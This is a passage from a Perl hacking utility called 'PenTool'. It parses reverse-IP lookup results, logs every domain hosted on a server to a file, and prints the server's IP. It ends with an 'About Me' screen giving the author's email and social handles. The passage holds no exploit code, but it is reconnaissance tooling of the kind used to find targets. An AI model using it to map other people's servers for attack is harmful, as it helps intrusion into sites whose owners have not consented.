        $zeb =~ m/\"(.*?)\", \"?\"/g;
open(a, ">>Log.txt");
print a "http://$1/\n";
close(a);
}
if($resulta =~ /\"domainCount\":\"(.*?)\"/) {
sleep(2);
  print "\n  [*]Total website Recolted: $1\n";
}
if($resulta =~ /\"remoteIpAddress\":\"(.*?)\"/) {
sleep(1);

  print "\n  [*] IP serveur: $1\n";
}
print "\n[+] Done All website Reversed.\n";
}}
}
if($targett eq '6')
{
system('title About Me');
print "Tool Name : PenTool\n";
print "Author : Kadd3chy\n";
print "18 Year Old\n";
print "Mail : moat3z.kadd3chy[at]gmail[.]com\n";
print "Facebook ID : fb.me/Kadd3chy.phtml\n";
print "ICQ Uin : 729325418\n";
system("pause");
}